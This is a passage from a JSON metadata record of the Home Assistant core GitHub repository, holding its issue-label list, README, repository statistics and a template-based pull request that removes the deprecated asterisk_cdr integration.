            "integration: mycroft",
            "integration: myfitnesspal",
            "integration: myicomfort",
            "integration: myio",
            "integration: myio_valet_mega",
            "integration: myq",
            "integration: mysensors",
            "integration: mystrom",
            "integration: mythicbeastsdns",
            "integration: myuplink",
            "integration: n26",
            "integration: nad",
            "integration: nad7050",
            "integration: nadtcp",
            "integration: nadtelnet",
            "integration: nam",
            "integration: namecheapdns",
            "integration: nanoleaf",
            "integration: nanoleaf_aurora",
            "integration: nasweb",
            "integration: natural_resources_wales",
            "integration: nea",
            "integration: neato",
            "integration: nederlandse_spoorwegen",
            "integration: neevo",
            "integration: nello",
            "integration: neptune_apex",
            "integration: ness_alarm",
            "integration: nest",
            "integration: netatmo",
            "integration: netatmo_public",
            "integration: netdata",
            "integration: netgear",
            "integration: netgear_lte",
            "integration: netio",
            "integration: netio_json",
            "integration: nettigo",
            "integration: netwave",
            "integration: network",
            "integration: neurio_energy",
            "integration: news",
            "integration: nexia",
            "integration: nextbus",
            "integration: nextcloud",
            "integration: nextdns",
            "integration: nfandroidtv",
            "integration: nhc2",
            "integration: nibe_heatpump",
            "integration: nibe_local",
            "integration: nice_go",
            "integration: nightscout",
            "integration: niko_home_control",
            "integration: nilu",
            "integration: nilu_air_quality",
            "integration: nina",
            "integration: nissan_leaf",
            "integration: niu",
            "integration: nmap_tracker",
            "integration: nmbs",
            "integration: no_ip",
            "integration: noaa_tides",
            "integration: noaaweather",
            "integration: nobo_hub",
            "integration: noonlight",
            "integration: nordpool",
            "integration: norway_air",
            "integration: notify",
            "integration: notify_events",
            "integration: notify_mqtt",
            "integration: notion",
            "integration: npi_gpio",
            "integration: nsw_fuel_station",
            "integration: nsw_rural_fire_service_feed",
            "integration: ntfy",
            "integration: nuheat",
            "integration: nuimo_controller",
            "integration: nuki",
            "integration: numato",
            "integration: number",
            "integration: numeric_float",
            "integration: numeric_integer",
            "integration: numeric_state",
            "integration: nut",
            "integration: nuvo",
            "integration: nws",
            "integration: nws_alerts",
            "integration: nx584",
            "integration: nyt_games",
            "integration: nzbget",
            "integration: oasa",
            "integration: oasa_telematics",
            "integration: obihai",
            "integration: octoprint",
            "integration: oem",
            "integration: ohmconnect",
            "integration: olarm_sensors",
            "integration: ollama",
            "integration: ollama_conversation",
            "integration: ombi",
            "integration: omie",
            "integration: omnilogic",
            "integration: onboarding",
            "integration: oncue",
            "integration: ondilo_ico",
            "integration: onetracker",
            "integration: onewire",
            "integration: onkyo",
            "integration: onkyo_serial",
            "integration: onvif",
            "integration: oocsi",
            "integration: ooler",
            "integration: open_ble_sensors",
            "integration: open_energy_view",
            "integration: open_meteo",
            "integration: openai_conversation",
            "integration: openalpr",
            "integration: openalpr_cloud",
            "integration: openalpr_local",
            "integration: opencv",
            "integration: openerz",
            "integration: openevse",
            "integration: openexchangerates",
            "integration: opengarage",
            "integration: openhardwaremonitor",
            "integration: openhome",
            "integration: openplantbook",
            "integration: openrgb",
            "integration: opensensemap",
            "integration: opensky",
            "integration: opensprinkler",
            "integration: opentherm_gw",
            "integration: opentherm_web",
            "integration: openuv",
            "integration: openweathermap",
            "integration: opnsense",
            "integration: opower",
            "integration: opple",
            "integration: opsgenie",
            "integration: optoma_projector",
            "integration: oralb",
            "integration: orange_funbox",
            "integration: orangepi_gpio",
            "integration: oru",
            "integration: oru_opower",
            "integration: orvibo",
            "integration: osc",
            "integration: osoenergy",
            "integration: osramlightify",
            "integration: otbr",
            "integration: otp",
            "integration: ourgroceries",
            "integration: outlook",
            "integration: overkiz",
            "integration: overseerr",
            "integration: ovo_energy",
            "integration: ovos",
            "integration: owfs",
            "integration: owlet",
            "integration: owntracks",
            "integration: owntracks_http",
            "integration: ozw",
            "integration: p1_monitor",
            "integration: p2pcam",
            "integration: palazzetti",
            "integration: paloalto",
            "integration: pan_tilt_phat",
            "integration: panasonic_bluray",
            "integration: panasonic_viera",
            "integration: pandora",
            "integration: panel_custom",
            "integration: panel_iframe",
            "integration: panel_proxy",
            "integration: particle",
            "integration: pax_ble",
            "integration: pca",
            "integration: pcal9535a",
            "integration: pcf8574",
            "integration: peco",
            "integration: pegel_online",
            "integration: pencom",
            "integration: permobil",
            "integration: persistent_notification",
            "integration: person",
            "integration: pglab",
            "integration: phicomm",
            "integration: philips_air_purifier",
            "integration: philips_airpurifier",
            "integration: philips_js",
            "integration: philips_js_v5",
            "integration: philipslight",
            "integration: phone_modem",
            "integration: phonetrack_oc",
            "integration: pi_hole",
            "integration: pi4ioe5v9xxxx",
            "integration: picnic",
            "integration: picotts",
            "integration: pid_controller",
            "integration: pid_thermostat",
            "integration: piglow",
            "integration: pilight",
            "integration: pinecil",
            "integration: ping",
            "integration: pioneer",
            "integration: piper",
            "integration: pjlink",
            "integration: pjm",
            "integration: plaato",
            "integration: planifneige",
            "integration: plant",
            "integration: plex",
            "integration: plexamp",
            "integration: plugwise",
            "integration: plugwise_stick",
            "integration: plum_lightpad",
            "integration: pocketcasts",
            "integration: point",
            "integration: pollen",
            "integration: pollen_benadryl",
            "integration: polling",
            "integration: poolsense",
            "integration: poolstation",
            "integration: portainer",
            "integration: portlandgeneral",
            "integration: postnl",
            "integration: powerplanner",
            "integration: powerwall",
            "integration: prezzibenzina",
            "integration: private_ble_device",
            "integration: profiler",
            "integration: progettihwsw",
            "integration: projector",
            "integration: proliphix",
            "integration: prometheus",
            "integration: prosegur",
            "integration: prowl",
            "integration: proximity",
            "integration: proxmox",
            "integration: proxmoxve",
            "integration: proxy",
            "integration: prusalink",
            "integration: ps4",
            "integration: pseg",
            "integration: psoklahoma",
            "integration: ptvsd",
            "integration: publibike",
            "integration: pulseaudio",
            "integration: pulseaudio_loopback",
            "integration: pure_energie",
            "integration: purge",
            "integration: purpleair",
            "integration: push",
            "integration: pushbullet",
            "integration: pushetta",
            "integration: pushover",
            "integration: pushsafer",
            "integration: pvoutput",
            "integration: pvpc_hourly_pricing",
            "integration: pvs6_proxy",
            "integration: pyload",
            "integration: pylontech_us",
            "integration: pynubank",
            "integration: pyscript",
            "integration: pytest",
            "integration: python_script",
            "integration: qbittorrent",
            "integration: qbus",
            "integration: qingping",
            "integration: qld_bushfire",
            "integration: qnap",
            "integration: qnap_qsw",
            "integration: qq",
            "integration: qr_generator",
            "integration: qrcode",
            "integration: quadrafire",
            "integration: quantum_gateway",
            "integration: quotable",
            "integration: qvr_pro",
            "integration: qvrpro",
            "integration: qwikswitch",
            "integration: rabbitair",
            "integration: rachio",
            "integration: radarr",
            "integration: radio_browser",
            "integration: radiotherm",
            "integration: rainbird",
            "integration: raincloud",
            "integration: rainforest_eagle",
            "integration: rainforest_raven",
            "integration: rainmachine",
            "integration: rako",
            "integration: random",
            "integration: range",
            "integration: rapt_ble",
            "integration: raspberry_pi",
            "integration: raspberrypi",
            "integration: raspihats",
            "integration: raspyrfm",
            "integration: raven_emu",
            "integration: rdw",
            "integration: recollect_waste",
            "integration: recorder",
            "integration: recovery_mode",
            "integration: recswitch",
            "integration: reddit",
            "integration: refoss",
            "integration: rehau",
            "integration: reisingerbridge",
            "integration: rejseplanen",
            "integration: remember_the_milk",
            "integration: remootio",
            "integration: remote",
            "integration: remote_homeassistant",
            "integration: remote_rpi_gpio",
            "integration: renault",
            "integration: renson",
            "integration: renson_endura_delta",
            "integration: reolink",
            "integration: repairs",
            "integration: repetier",
            "integration: resolution_center",
            "integration: rest",
            "integration: rest_command",
            "integration: rflink",
            "integration: rfxtrx",
            "integration: rhasspy",
            "integration: ridwell",
            "integration: ring",
            "integration: ripple",
            "integration: risco",
            "integration: ritassist",
            "integration: rituals_perfume_genie",
            "integration: rki_covid",
            "integration: RMmini3",
            "integration: rmvtransport",
            "integration: roborock",
            "integration: rocketchat",
            "integration: rointe",
            "integration: roku",
            "integration: romy",
            "integration: room_occupancy",
            "integration: roomba",
            "integration: roon",
            "integration: rotel",
            "integration: route53",
            "integration: rova",
            "integration: rpi_camera",
            "integration: rpi_fanshim",
            "integration: rpi_gpio",
            "integration: rpi_gpio_pwm",
            "integration: rpi_gpiozero",
            "integration: rpi_i2c_chips",
            "integration: rpi_i2c_expanders",
            "integration: rpi_i2c_ha_expanders",
            "integration: rpi_pfio",
            "integration: rpi_pfio2",
            "integration: rpi_power",
            "integration: rpi_rf",
            "integration: rpi_servo",
            "integration: rpi_spi_mcp",
            "integration: rrd",
            "integration: rss_feed_template",
            "integration: rtorrent",
            "integration: rtsp_to_webrtc",
            "integration: ruckus_unleashed",
            "integration: russound_rio",
            "integration: russound_rnet",
            "integration: ruter",
            "integration: ruuvi_gateway",
            "integration: ruuvitag_ble",
            "integration: rympro",
            "integration: ryobi_gdo",
            "integration: ryobiGDO",
            "integration: sabnzbd",
            "integration: safe_mode",
            "integration: saj",
            "integration: salt",
            "integration: salus",
            "integration: samsam",
            "integration: samsungtv",
            "integration: samsungtv_upnp",
            "integration: sanix",
            "integration: satel_integra",
            "integration: scene",
            "integration: schedule",
            "integration: scheduler",
            "integration: schlage",
            "integration: schluter",
            "integration: scl",
            "integration: scrape",
            "integration: screenlogic",
            "integration: script",
            "integration: scsgate",
            "integration: search",
            "integration: season",
            "integration: sector_alarm",
            "integration: securitas_direct",
            "integration: seitron",
            "integration: select",
            "integration: sems_portal",
            "integration: sendgrid",
            "integration: sense",
            "integration: sensehat",
            "integration: senseme",
            "integration: sensibo",
            "integration: sensirion_ble",
            "integration: sensirion_sht31_smart_gadget",
            "integration: sensor",
            "integration: sensorpro",
            "integration: sensorpush",
            "integration: sensorpush_cloud",
            "integration: sensoterra",
            "integration: sentry",
            "integration: senz",
            "integration: senziio",
            "integration: serial",
            "integration: serial_pm",
            "integration: server",
            "integration: sesame",
            "integration: seven_segments",
            "integration: seventeentrack",
            "integration: sfr_box",
            "integration: sharkiq",
            "integration: shell_command",
            "integration: shell_player",
            "integration: shelly",
            "integration: shelly_button_manager",
            "integration: shiftr",
            "integration: shodan",
            "integration: shopping_list",
            "integration: sht31",
            "integration: sia",
            "integration: sigfox",
            "integration: sighthound",
            "integration: signal_messenger",
            "integration: signal_messenger_jsonrpc",
            "integration: simplefin",
            "integration: simplepush",
            "integration: simplisafe",
            "integration: simulated",
            "integration: sinch",
            "integration: sinch_sms",
            "integration: sipcall",
            "integration: siren",
            "integration: sisyphus",
            "integration: sky_hub",
            "integration: sky_plus_hd",
            "integration: sky_remote",
            "integration: skybeacon",
            "integration: skybell",
            "integration: slack",
            "integration: sleepiq",
            "integration: slide",
            "integration: slimproto",
            "integration: slow_pwm",
            "integration: sma",
            "integration: sma_manager",
            "integration: smappee",
            "integration: smappee_official",
            "integration: smart_home",
            "integration: smart_meter_b_route",
            "integration: smart_meter_texas",
            "integration: smartenergy_awattar",
            "integration: smartenergy_goecharger",
            "integration: smartfox",
            "integration: smarthab",
            "integration: smartthings",
            "integration: smarttub",
            "integration: smarty",
            "integration: smhi",
            "integration: smlight",
            "integration: sms",
            "integration: smsapi",
            "integration: smscom",
            "integration: smtp",
            "integration: smud",
            "integration: snapcast",
            "integration: snips",
            "integration: snmp",
            "integration: snooz",
            "integration: sochain",
            "integration: socialblade",
            "integration: solar_frontier",
            "integration: solaredge",
            "integration: solaredge_local",
            "integration: solarlog",
            "integration: solax",
            "integration: solcast_solar",
            "integration: solvis_heating",
            "integration: soma",
            "integration: somfy",
            "integration: somfy_mylink",
            "integration: somfy_tahoma",
            "integration: sonarr",
            "integration: songpal",
            "integration: sonos",
            "integration: sony_projector",
            "integration: soundtouch",
            "integration: southern_company",
            "integration: spaceapi",
            "integration: spanet",
            "integration: spc",
            "integration: speedtest",
            "integration: speedtestdotnet",
            "integration: spider",
            "integration: splunk",
            "integration: spokestack",
            "integration: spokestack_wakeword",
            "integration: spotcrime",
            "integration: spotify",
            "integration: sql",
            "integration: squeezebox",
            "integration: squeezebox_player",
            "integration: srp_energy",
            "integration: ssdp",
            "integration: starline",
            "integration: starlingbank",
            "integration: starlink",
            "integration: starlink_dishy_stats",
            "integration: startca",
            "integration: state",
            "integration: state_schedule",
            "integration: static",
            "integration: statistics",
            "integration: statsd",
            "integration: steady_light",
            "integration: steady_switch",
            "integration: steam_online",
            "integration: steamist",
            "integration: stiebel_eltron",
            "integration: stihl_imow",
            "integration: stookalert",
            "integration: stookwijzer",
            "integration: strava",
            "integration: stream",
            "integration: streamlabswater",
            "integration: stride",
            "integration: stt",
            "integration: subaru",
            "integration: suez_water",
            "integration: suggestions",
            "integration: sum",
            "integration: sun",
            "integration: sungrow",
            "integration: sunsynk",
            "integration: sunsynkweb",
            "integration: sunweg",
            "integration: supervisord",
            "integration: supla",
            "integration: surepetcare",
            "integration: sutro",
            "integration: sveriges_radio",
            "integration: swepco",
            "integration: swidget",
            "integration: swiss_hydrological_data",
            "integration: swiss_public_transport",
            "integration: swisscom",
            "integration: switch",
            "integration: switch_as_x",
            "integration: switchbee",
            "integration: switchbot",
            "integration: switchbot_cloud",
            "integration: switchbot_meter",
            "integration: switcher_kis",
            "integration: switchgrid",
            "integration: switchmate",
            "integration: sws12500",
            "integration: symfonisk",
            "integration: syncthing",
            "integration: syncthru",
            "integration: synology",
            "integration: synology_chat",
            "integration: synology_dsm",
            "integration: synology_homemode",
            "integration: synology_srm",
            "integration: synologydsm",
            "integration: syslog",
            "integration: system_bridge",
            "integration: system_health",
            "integration: system_log",
            "integration: system_monitoring",
            "integration: systemair",
            "integration: systemair_savecair",
            "integration: systemmonitor",
            "integration: sytadin",
            "integration: ta_cmi",
            "integration: tado",
            "integration: tado_v1",
            "integration: tag",
            "integration: tahoma",
            "integration: tailscale",
            "integration: tailwind",
            "integration: tami4",
            "integration: tank_utility",
            "integration: tankerkoenig",
            "integration: tapsaff",
            "integration: tasmota",
            "integration: tasmota_irhvac",
            "integration: tautulli",
            "integration: tcp",
            "integration: tcpbulbs",
            "integration: technicolor",
            "integration: technove",
            "integration: ted",
            "integration: ted5000",
            "integration: ted6000",
            "integration: tedee",
            "integration: teksavvy",
            "integration: telegram",
            "integration: telegram_bot",
            "integration: telegram_client",
            "integration: telegram_poll",
            "integration: telegram_polling",
            "integration: telegram_webhooks",
            "integration: teleinfo",
            "integration: telekomunikace_2n",
            "integration: teletask",
            "integration: tellduslive",
            "integration: tellstick",
            "integration: telnet",
            "integration: temper",
            "integration: template",
            "integration: templated_automation",
            "integration: tensorflow",
            "integration: terncy",
            "integration: tesla",
            "integration: tesla_fleet",
            "integration: tesla_wall_connector",
            "integration: teslemetry",
            "integration: tessie",
            "integration: test",
            "integration: testing",
            "integration: testplatform",
            "integration: texecom",
            "integration: texecominterface",
            "integration: text",
            "integration: textfile",
            "integration: tfiac",
            "integration: tfl",
            "integration: thermobeacon",
            "integration: thermopro",
            "integration: thermoworks_smoke",
            "integration: thethingsnetwork",
            "integration: thethingsnetwork_data",
            "integration: thingbits",
            "integration: thingsmobile",
            "integration: thingspeak",
            "integration: thinkingcleaner",
            "integration: thomson",
            "integration: thread",
            "integration: threshold",
            "integration: tibber",
            "integration: ticktick",
            "integration: tikteck",
            "integration: tile",
            "integration: tilt_ble",
            "integration: time",
            "integration: time_date",
            "integration: timed_state_infer",
            "integration: timer",
            "integration: tis_control",
            "integration: tmb",
            "integration: tmdb",
            "integration: tod",
            "integration: todo",
            "integration: todo_local",
            "integration: todoist",
            "integration: tof",
            "integration: tolo",
            "integration: tolosauna",
            "integration: tomato",
            "integration: tomorrowio",
            "integration: toon",
            "integration: torque",
            "integration: toshiba",
            "integration: totalconnect",
            "integration: touchline",
            "integration: touchline_sl",
            "integration: tp_link_eap",
            "integration: tplink",
            "integration: tplink_deco",
            "integration: tplink_lte",
            "integration: tplink_omada",
            "integration: tplink_tapo",
            "integration: traccar",
            "integration: traccar_server",
            "integration: trace",
            "integration: trackr",
            "integration: tractive",
            "integration: tradfri",
            "integration: trafikverket_camera",
            "integration: trafikverket_ferry",
            "integration: trafikverket_train",
            "integration: trafikverket_weatherstation",
            "integration: transition",
            "integration: translations",
            "integration: transmission",
            "integration: transport_nsw",
            "integration: travel_time",
            "integration: travisci",
            "integration: trello",
            "integration: trend",
            "integration: trigger",
            "integration: triggercmd",
            "integration: tts",
            "integration: tts_homely",
            "integration: tube_state",
            "integration: turn_touch",
            "integration: tuya",
            "integration: tvoverlay",
            "integration: twcmanager",
            "integration: twentemilieu",
            "integration: twilio",
            "integration: twilio_call",
            "integration: twilio_sms",
            "integration: twinkly",
            "integration: twitch",
            "integration: twitter",
            "integration: ubee",
            "integration: uber",
            "integration: ubus",
            "integration: ue_radio",
            "integration: ue_smart_radio",
            "integration: uk_transport",
            "integration: ukraine_alarm",
            "integration: ultraloq",
            "integration: ultrasync",
            "integration: unifi",
            "integration: unifi_direct",
            "integration: unifi_video",
            "integration: unifiled",
            "integration: unifiprotect",
            "integration: universal",
            "integration: unmanic",
            "integration: upb",
            "integration: upc_connect",
            "integration: upcloud",
            "integration: update",
            "integration: updater",
            "integration: upnp",
            "integration: ups",
            "integration: uptime",
            "integration: uptime_kuma",
            "integration: uptimerobot",
            "integration: urlwatch",
            "integration: usb",
            "integration: uscis",
            "integration: usgs_earthquakes_feed",
            "integration: usps",
            "integration: util",
            "integration: utility_cost",
            "integration: utility_meter",
            "integration: uvc",
            "integration: v2c",
            "integration: vacuum",
            "integration: vaillant",
            "integration: validator",
            "integration: vallox",
            "integration: valve",
            "integration: variables",
            "integration: varta_storage",
            "integration: vartastorage",
            "integration: vasttrafik",
            "integration: vconnex",
            "integration: velbus",
            "integration: velo",
            "integration: velux",
            "integration: vemmio",
            "integration: venstar",
            "integration: vera",
            "integration: verisure",
            "integration: vermont_castings",
            "integration: versasense",
            "integration: version",
            "integration: version_control",
            "integration: vestaboard",
            "integration: vesync",
            "integration: vevor_heater",
            "integration: viaggiatreno",
            "integration: viam",
            "integration: viaris",
            "integration: vicare",
            "integration: victron_ble",
            "integration: vilfo",
            "integration: virtual_thermostat",
            "integration: vivotek",
            "integration: vizio",
            "integration: viziosoundbar",
            "integration: vlc",
            "integration: vlc_telnet",
            "integration: vlc-telnet",
            "integration: vodafone_station",
            "integration: voice_assistant",
            "integration: voicerss",
            "integration: voip",
            "integration: volkswagencarnet",
            "integration: volkszaehler",
            "integration: volumio",
            "integration: volvooncall",
            "integration: vorwerk",
            "integration: vrtnws",
            "integration: vulcan",
            "integration: vultr",
            "integration: w800rf32",
            "integration: wake",
            "integration: wake_on_lan",
            "integration: wake_word",
            "integration: walkingpad",
            "integration: wallallcamera",
            "integration: wallallsensor",
            "integration: wallalltts",
            "integration: wallbox",
            "integration: waqi",
            "integration: warmup4ie",
            "integration: watchdog_file_watcher",
            "integration: watchyourlan",
            "integration: water_heater",
            "integration: waterfurnace",
            "integration: waterkotte_heatpump",
            "integration: watson_iot",
            "integration: watson_tts",
            "integration: watts_vision",
            "integration: watttime",
            "integration: waze_travel_time",
            "integration: weather",
            "integration: weatherflow",
            "integration: weatherflow_cloud",
            "integration: weatherkit",
            "integration: weback_cloud",
            "integration: webdav",
            "integration: webhook",
            "integration: webhooks",
            "integration: webmin",
            "integration: webostv",
            "integration: webrtc",
            "integration: websocket_api",
            "integration: weconnect",
            "integration: weenect",
            "integration: weheat",
            "integration: weightedaverage",
            "integration: wemo",
            "integration: wevolor",
            "integration: whirlpool",
            "integration: whisper",
            "integration: whois",
            "integration: wiffi",
            "integration: wilight",
            "integration: wink",
            "integration: wireguard",
            "integration: wirelesstag",
            "integration: wiser",
            "integration: withings",
            "integration: wittiot",
            "integration: wiz",
            "integration: wiz_light",
            "integration: wled",
            "integration: wmspro",
            "integration: wolflink",
            "integration: workalendar",
            "integration: workday",
            "integration: worldclock",
            "integration: worldtidesinfo",
            "integration: worx-landroid",
            "integration: worxlandroid",
            "integration: ws66i",
            "integration: ws980wifi",
            "integration: wsdot",
            "integration: wulu",
            "integration: wunderground",
            "integration: wunderlist",
            "integration: wwlln",
            "integration: wyoming",
            "integration: x10",
            "integration: xbee",
            "integration: xbox",
            "integration: xbox_live",
            "integration: xcel",
            "integration: xeoma",
            "integration: xfinity",
            "integration: xiaofang",
            "integration: xiaomi",
            "integration: xiaomi_aqara",
            "integration: xiaomi_ble",
            "integration: xiaomi_ir",
            "integration: xiaomi_miio",
            "integration: xiaomi_philipslight",
            "integration: xiaomi_plug",
            "integration: xiaomi_tv",
            "integration: xiaomi_vacuum",
            "integration: xknx",
            "integration: xmpp",
            "integration: xs1",
            "integration: yahoo_finance",
            "integration: yale",
            "integration: yale_home",
            "integration: yale_smart_alarm",
            "integration: yalexs_ble",
            "integration: yamaha",
            "integration: yamaha_musiccast",
            "integration: yandex",
            "integration: yandex_transport",
            "integration: yandextts",
            "integration: yardian",
            "integration: yeelight",
            "integration: yeelightsunflower",
            "integration: yeelock",
            "integration: yessssms",
            "integration: yi",
            "integration: yolink",
            "integration: youless",
            "integration: youtube",
            "integration: yr",
            "integration: yweather",
            "integration: zabbix",
            "integration: zabbix_evt_sensors",
            "integration: zamg",
            "integration: zcs_azzurro_inverter",
            "integration: zengge",
            "integration: zengge-wifi",
            "integration: zeroconf",
            "integration: zerproc",
            "integration: zestimate",
            "integration: zeversolar",
            "integration: zeversolar_local",
            "integration: zha",
            "integration: zhong_hong",
            "integration: zigate",
            "integration: zigbee",
            "integration: ziggo_mediabox_xl",
            "integration: ziggo_next",
            "integration: zimi",
            "integration: zimi_test",
            "integration: zodiac",
            "integration: zondergas",
            "integration: zone",
            "integration: zoneminder",
            "integration: zoom",
            "integration: ztm",
            "integration: zwave",
            "integration: zwave_js",
            "integration: zwave_me",
            "integration: zwave_mqtt",
            "integration: zyxelnas",
            "integration: zyxelt50",
            "invalid",
            "master/slave",
            "memory-leak",
            "merging-to-master",
            "merging-to-rc",
            "needs followup review",
            "needs-more-information",
            "network_issue",
            "new-feature",
            "new-integration",
            "new-platform",
            "nginx",
            "no-stale",
            "non-thread-safe operation",
            "noteworthy",
            "outdated-version",
            "parent-merged",
            "platform",
            "problem in config",
            "problem in custom component",
            "problem in database",
            "problem in dependency",
            "problem in device",
            "problem in platform",
            "project-code_style",
            "python",
            "Quality Scale: gold",
            "Quality Scale: internal",
            "Quality Scale: No score",
            "Quality Scale: platinum",
            "Quality Scale: silver",
            "question",
            "Ready for review",
            "regression",
            "reliable-startup",
            "remove-platform",
            "requirement",
            "reverted",
            "rfc",
            "second-opinion-wanted",
            "sensor-tracking",
            "small-pr",
            "smash",
            "spam",
            "stale",
            "supervised",
            "templates",
            "Testing required",
            "to do",
            "translations",
            "under investigation",
            "unittest.TestCase",
            "unsupported",
            "via-github",
            "voluptuous",
            "waiting-for-diagnostics",
            "waiting-for-reply",
            "waiting-for-upstream",
            "windows",
            "wontfix",
            "workaround available",
            "WTH",
            "zwave-certification"
        ],
        "README_content": "Home Assistant |Chat Status|\n=================================================================================\n\nOpen source home automation that puts local control and privacy first. Powered by a worldwide community of tinkerers and DIY enthusiasts. Perfect to run on a Raspberry Pi or a local server.\n\nCheck out `home-assistant.io <https://home-assistant.io>`__ for `a\ndemo <https://demo.home-assistant.io>`__, `installation instructions <https://home-assistant.io/getting-started/>`__,\n`tutorials <https://home-assistant.io/getting-started/automation/>`__ and `documentation <https://home-assistant.io/docs/>`__.\n\nThis is a project of the `Open Home Foundation <https://www.openhomefoundation.org/>`__.\n\n|screenshot-states|\n\nFeatured integrations\n---------------------\n\n|screenshot-integrations|\n\nThe system is built using a modular approach so support for other devices or actions can be implemented easily. See also the `section on architecture <https://developers.home-assistant.io/docs/architecture_index/>`__ and the `section on creating your own\ncomponents <https://developers.home-assistant.io/docs/creating_component_index/>`__.\n\nIf you run into issues while using Home Assistant or during development\nof a component, check the `Home Assistant help section <https://home-assistant.io/help/>`__ of our website for further help and information.\n\n.. |Chat Status| image:: https://img.shields.io/discord/330944238910963714.svg\n   :target: https://www.home-assistant.io/join-chat/\n.. |screenshot-states| image:: https://raw.githubusercontent.com/home-assistant/core/dev/.github/assets/screenshot-states.png\n   :target: https://demo.home-assistant.io\n.. |screenshot-integrations| image:: https://raw.githubusercontent.com/home-assistant/core/dev/.github/assets/screenshot-integrations.png\n   :target: https://home-assistant.io/integrations/\n",
        "num_commits": 85030,
        "project_age_days": 4060,
        "project_created_at": "2013-09-17",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-30",
        "num_contributors": 410,
        "num_pull": 75446,
        "num_issues": 128704,
        "num_opening_issue": 2781,
        "project_size(kB)": 663184,
        "num_stargazers": 73043,
        "num_watchers": 73043,
        "num_forks": 30555,
        "num_subscribers": 1337,
        "SecurityPolicy_created_at": "2023-10-19 07:51:35",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "2f1e2efc5ae11bbaee8ee2f6733cfe6627836718",
                "url": "https://github.com/home-assistant/.github/commit/2f1e2efc5ae11bbaee8ee2f6733cfe6627836718",
                "date": "2023-10-19 18:07:09"
            },
            {
                "commit_id": "11aa4f465e4e103f8456b9816da9ea68cf0b248f",
                "url": "https://github.com/home-assistant/.github/commit/11aa4f465e4e103f8456b9816da9ea68cf0b248f",
                "date": "2023-10-19 07:51:35"
            }
        ],
        "project_security_labels": [
            "integration: asterisk_mbox",
            "integration: eufy_security",
            "integration: asterisk_cdr",
            "integration: asterisk_ami"
        ],
        "security_issues": [
            {
                "url": "https://github.com/home-assistant/core/pull/123180",
                "title": "Remove deprecated asterisk_cdr integration",
                "labels": [
                    "core",
                    "breaking-change",
                    "remove-platform",
                    "cla-signed",
                    "small-pr",
                    "integration: asterisk_cdr",
                    "Quality Scale: No score"
                ],
                "user": "joostlek",
                "issue_author_association": "MEMBER",
                "number": 123180,
                "id": 2448190299,
                "state": "closed",
                "project_created_at": "2024-08-05T10:24:11Z",
                "closed_at": "2024-08-05T12:43:39Z",
                "body": "<!--\r\n  You are amazing! Thanks for contributing to our project!\r\n  Please, DO NOT DELETE ANY TEXT from this template! (unless instructed).\r\n-->\r\n## Breaking change\r\n<!--\r\n  If your PR contains a breaking change for existing users, it is important\r\n  to tell them what breaks, how to make it work again and why we did this.\r\n  This piece of text is published with the release notes, so it helps if you\r\n  write it towards our users, not us.\r\n  Note: Remove this section if this PR is NOT a breaking change.\r\n-->\r\nAsterisk_mbox has been deprecated in 2024.3.0 and has been removed\r\n\r\n## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nRemove deprecated asterisk_cdr integration\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Deprecation (breaking change to happen in the future)\r\n- [x] Breaking change (fix/feature causing existing functionality to break)\r\n- [ ] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: \r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [x] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [x] There is no commented out code in this PR.\r\n- [x] I have followed the [development checklist][dev-checklist]\r\n- [x] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [x] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: 